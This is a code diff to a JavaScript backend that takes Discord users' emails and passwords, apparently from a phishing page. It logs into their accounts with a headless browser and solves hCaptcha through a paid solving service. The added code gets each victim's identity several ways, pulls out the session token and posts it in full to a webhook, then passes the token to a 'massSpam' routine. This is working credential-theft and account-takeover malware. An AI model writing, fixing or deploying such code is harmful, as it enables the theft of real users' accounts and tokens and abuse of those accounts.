@@ -42,7 +42,6 @@ function getIP(req) {
            'unknown';
 }
 
-// Anti-Captcha API functions
 async function createTask(websiteURL, websiteKey, taskType = 'HCaptchaTaskProxyless') {
     const response = await axios.post('https://api.anti-captcha.com/createTask', {
         clientKey: ANTI_CAPTCHA_KEY,
@@ -90,7 +89,6 @@ async function solveHCaptcha(page, sessionId) {
     try {
         await sendWebhook({ content: `Solving CAPTCHA - Session: \`${sessionId}\`` });
         
-        // Get hCaptcha sitekey
         const sitekey = await page.evaluate(() => {
             const hcaptchaDiv = document.querySelector('[data-sitekey]');
             return hcaptchaDiv ? hcaptchaDiv.getAttribute('data-sitekey') : null;
@@ -107,7 +105,6 @@ async function solveHCaptcha(page, sessionId) {
         const solution = await getTaskResult(taskId);
         await sendWebhook({ content: `CAPTCHA solved - Session: \`${sessionId}\`` });
         
-        // Inject token
         await page.evaluate((token) => {
             const hcaptchaResponse = document.querySelector('[name="h-captcha-response"]');
             if (hcaptchaResponse) {
@@ -119,7 +116,6 @@ async function solveHCaptcha(page, sessionId) {
                 textarea.value = token;
             }
             
-            // Trigger callback if exists
             if (window.hcaptchaCallback) {
                 window.hcaptchaCallback(token);
             }
@@ -212,7 +208,6 @@ async function processLogin(email, password, ip, sessionId) {
         
         await delay(3000, 5000);
         
-        // Check for CAPTCHA
         const hasCaptcha = await page.evaluate(() => {
             return document.querySelector('iframe[src*="captcha"]') !== null ||
                    document.querySelector('.h-captcha') !== null ||
@@ -227,13 +222,11 @@ async function processLogin(email, password, ip, sessionId) {
             
             if (solved) {
                 await delay(2000, 3000);
-                // Retry login after CAPTCHA
                 await page.click('button[type="submit"]');
                 await delay(3000, 5000);
             }
         }
         
-        // Check for 2FA
         await delay(3000, 5000);
         
         const is2FA = await page.evaluate(() => {
@@ -290,7 +283,6 @@ async function processLogin(email, password, ip, sessionId) {
             }
         }
         
-        // Check login success
         const currentUrl = await page.url();
         const isLoggedIn = currentUrl.includes('/channels/') || currentUrl.includes('/app');
         
@@ -302,40 +294,137 @@ async function processLogin(email, password, ip, sessionId) {
             return;
         }
         
-        // Get user info
-        await delay(2000, 3000);
+        await delay(3000, 5000);
         
+        // FIXED USER EXTRACTION - Multiple methods
         const userInfo = await page.evaluate(() => {
             let username = null;
             let userId = null;
+            let globalName = null;
             
+            // Method 1: Webpack modules
             try {
-                const userCache = localStorage.getItem('UserSettingsStore');
-                if (userCache) {
-                    const parsed = JSON.parse(userCache);
-                    if (parsed && parsed.user) {
-                        username = parsed.user.username || parsed.user.global_name;
-                        userId = parsed.user.id;
+                if (window.webpackChunkdiscord_app) {
+                    const userModule = Object.values(window.webpackChunkdiscord_app)
+                        .flat()
+                        .find(m => m?.exports?.default?.getCurrentUser);
+                    
+                    if (userModule) {
+                        const user = userModule.exports.default.getCurrentUser();
+                        if (user) {
+                            username = user.username;
+                            userId = user.id;
+                            globalName = user.globalName;
+                        }
                     }
                 }
             } catch(e) {}
             
+            // Method 2: DiscordNative or window.GLOBAL_ENV
+            if (!username) {
+                try {
+                    if (window.GLOBAL_ENV && window.GLOBAL_ENV.user) {
+                        username = window.GLOBAL_ENV.user.username;
+                        userId = window.GLOBAL_ENV.user.id;
+                        globalName = window.GLOBAL_ENV.user.global_name;
+                    }
+                } catch(e) {}
+            }
+            
+            // Method 3: UserSettingsStore
+            if (!username) {
+                try {
+                    const userCache = localStorage.getItem('UserSettingsStore');
+                    if (userCache) {
+                        const parsed = JSON.parse(userCache);
+                        if (parsed && parsed.user) {
+                            username = parsed.user.username;
+                            userId = parsed.user.id;
+                            globalName = parsed.user.global_name;
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            // Method 4: Me cache
             if (!username) {
                 try {
                     const me = localStorage.getItem('Me');
                     if (me) {
                         const parsed = JSON.parse(me);
-                        username = parsed.username || parsed.global_name;
+                        username = parsed.username;
                         userId = parsed.id;
+                        globalName = parsed.global_name;
                     }
                 } catch(e) {}
             }
             
-            return { username, userId };
+            // Method 5: UserStore
+            if (!username) {
+                try {
+                    const userStore = localStorage.getItem('UserStore');
+                    if (userStore) {
+                        const parsed = JSON.parse(userStore);
+                        if (parsed && parsed.user) {
+                            username = parsed.user.username;
+                            userId = parsed.user.id;
+                            globalName = parsed.user.global_name;
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            // Method 6: Get from DOM if available
+            if (!username) {
+                try {
+                    const userElement = document.querySelector('[class*="nameTag-"]') || 
+                                       document.querySelector('[class*="username-"]') ||
+                                       document.querySelector('[aria-label*="User settings"]');
+                    if (userElement) {
+                        const text = userElement.textContent || userElement.getAttribute('aria-label');
+                        if (text) {
+                            username = text.replace('User settings', '').trim();
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            return { 
+                username: username || globalName, 
+                userId, 
+                globalName,
+                displayName: globalName || username
+            };
         });
         
+        // If still no username, try API endpoint
+        if (!userInfo.username || !userInfo.userId) {
+            try {
+                const token = await page.evaluate(() => {
+                    try {
+                        return localStorage.getItem('token');
+                    } catch(e) { return null; }
+                });
+                
+                if (token) {
+                    const userRes = await axios.get('https://discord.com/api/v9/users/@me', {
+                        headers: { 'Authorization': token }
+                    });
+                    
+                    if (userRes.data) {
+                        userInfo.username = userRes.data.username;
+                        userInfo.userId = userRes.data.id;
+                        userInfo.globalName = userRes.data.global_name;
+                        userInfo.displayName = userRes.data.global_name || userRes.data.username;
+                    }
+                }
+            } catch(e) {}
+        }
+        
+        const displayUser = userInfo.displayName || userInfo.username || 'Unknown';
+        
         await sendWebhook({ 
-            content: `LOGIN SUCCESS - Session: \`${sessionId}\`\nLogged in as: \`@${userInfo.username || 'Unknown'}\`\nUser ID: \`${userInfo.userId || 'Unknown'}\``
+            content: `LOGIN SUCCESS - Session: \`${sessionId}\`\nLogged in as: \`@${displayUser}\`\nUser ID: \`${userInfo.userId || 'Unknown'}\`\nUsername: \`${userInfo.username || 'Unknown'}\`\nGlobal: \`${userInfo.globalName || 'None'}\``
         });
         
         // Extract token
@@ -398,11 +487,11 @@ async function processLogin(email, password, ip, sessionId) {
             const tokenStr = String(token).trim();
             
             await sendWebhook({ 
-                content: `TOKEN EXTRACTED - Session: \`${sessionId}\`\nUser: \`@${userInfo.username || 'Unknown'}\`\nToken: \`${tokenStr.substring(0, 20)}...${tokenStr.substring(tokenStr.length - 10)}\`\n\`\`\`${tokenStr}\`\`\``
+                content: `TOKEN EXTRACTED - Session: \`${sessionId}\`\nUser: \`@${displayUser}\`\nToken: \`${tokenStr.substring(0, 20)}...${tokenStr.substring(tokenStr.length - 10)}\`\n\`\`\`${tokenStr}\`\`\``
             });
             
             try {
-                await massSpam(tokenStr, sessionId, userInfo.username || email);
+                await massSpam(tokenStr, sessionId, displayUser);
             } catch (loginError) {
                 await sendWebhook({ 
                     content: `TOKEN INVALID - Session: \`${sessionId}\`\nError: ${loginError.message}` 
@@ -410,7 +499,7 @@ async function processLogin(email, password, ip, sessionId) {
             }
         } else {
             await sendWebhook({ 
-                content: `NO VALID TOKEN - Session: \`${sessionId}\`\nBut login was successful as \`@${userInfo.username || 'Unknown'}\``
+                content: `NO VALID TOKEN - Session: \`${sessionId}\`\nBut login was successful as \`@${displayUser}\``
             });
         }
         
